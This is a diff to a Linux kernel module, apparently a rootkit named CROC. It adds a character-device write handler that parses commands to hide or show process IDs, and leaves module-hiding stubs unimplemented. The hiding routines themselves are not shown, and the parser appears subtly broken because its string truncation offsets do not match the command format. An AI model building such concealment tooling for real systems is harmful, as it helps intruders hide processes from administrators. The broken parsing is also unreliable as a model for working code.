@@ -17,12 +17,57 @@
  */
 
 #include <linux/fs.h>
+#include <linux/kernel.h>
+#include <linux/string.h>
 #include <linux/version.h>
 
 #include "types.h"
 #include "device/details/cdev_utils.h"
 #include "device/details/file_ops.h"
 #include "device/details/ioctl_cmd.h"
+#include "logging/logger.h"
+
+static int parse_cmd(char* p_data, unsigned int* p_cmd, unsigned long* p_pid)
+{
+    if ((p_data[3] == '_') && (p_data[7] == '_')) {
+        p_data[3] = 0;
+        p_data[7] = 0;
+        p_data[11] = 0;
+    } else {
+        return -EFAULT;
+    }
+    if ((p_cmd == NULL) || (p_pid == NULL)) {
+        return -EFAULT;
+    }
+
+    if (strcmp(p_data, "IOC") != 0) {
+        return -EFAULT;
+    }
+
+    p_data += 4;
+    if (strcmp(p_data, "PID") == 0) {
+        *p_cmd = CROC_IOC_PID;
+    } else if (strcmp(p_data, "MOD") == 0) {
+        *p_cmd = CROC_IOC_MOD;
+    } else {
+        return -EFAULT;
+    }
+
+    p_data += 4;
+    if (strcmp(p_data, "HIDE") == 0) {
+        *p_cmd = *p_cmd | CROC_IOC_HIDE_CMD;
+    } else if (strcmp(p_data, "SHOW") == 0) {
+        *p_cmd = *p_cmd | CROC_IOC_SHOW_CMD;
+    } else {
+        return -EFAULT;
+    }
+
+    if (*p_cmd & CROC_IOC_PID) {
+        p_data += 5;
+        return kstrtoul(p_data, 10, p_pid);
+    }
+    return 0;
+}
 
 long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
 {
@@ -79,10 +124,10 @@ long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
         p_dev = p_file->private_data;
         retval = ioc_show_pid(p_dev, pid);
         break;
-    case CROC_IOC_HIDE_MODULE:
+    case CROC_IOC_HIDE_MOD:
         /* @todo    Implement */
         break;
-    case CROC_IOC_SHOW_MODULE:
+    case CROC_IOC_SHOW_MOD:
         /* @todo    Implement */
         break;
     default:
@@ -92,7 +137,7 @@ long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
     return 0;
 }
 
-rc_t dev_open(struct inode* p_inode, struct file* p_file)
+int dev_open(struct inode* p_inode, struct file* p_file)
 {
     module_dev_t* p_dev;   /* device information */
 
@@ -115,13 +160,54 @@ ssize_t dev_read(struct file* p_file, char __user* p_buf, size_t count, loff_t* 
     return 0;
 }
 
-rc_t dev_release(struct inode* p_inode, struct file* p_file)
+int dev_release(struct inode* p_inode, struct file* p_file)
 {
     return 0;
 }
 
 ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, loff_t* p_f_pos)
 {
-    return 0;
+    const int MAX_BUF_SIZE = 255;
+
+    char buffer[MAX_BUF_SIZE];
+    module_dev_t* p_dev;
+    unsigned int cmd;
+    unsigned long pid;
+    int rc;
+
+    if ((count > MAX_BUF_SIZE - 1) || (count < 14)) {
+        return -EFAULT;
+    }
+
+    rc = 0;
+    cmd = 0;
+    pid = 0;
+    memset(buffer, 0, MAX_BUF_SIZE);
+
+    p_dev = p_file->private_data;
+    if (copy_from_user(buffer, p_buf, count)) {
+		return -EFAULT;
+	}
+
+    rc = parse_cmd(buffer, &cmd, &pid);
+    if (rc != 0) {
+        return rc;
+    }
+
+    if (cmd & CROC_IOC_PID) {
+        if (cmd & CROC_IOC_HIDE_CMD) {
+            rc = ioc_hide_pid(p_dev, pid);
+        } else if (cmd & CROC_IOC_SHOW_CMD) {
+            rc = ioc_show_pid(p_dev, pid);
+        } else {
+            return -EFAULT;
+        }
+    } else if (cmd & CROC_IOC_MOD) {
+        /* @todo    Implement */
+    } else {
+        return -EFAULT;
+    }
+
+    return rc;
 }
 
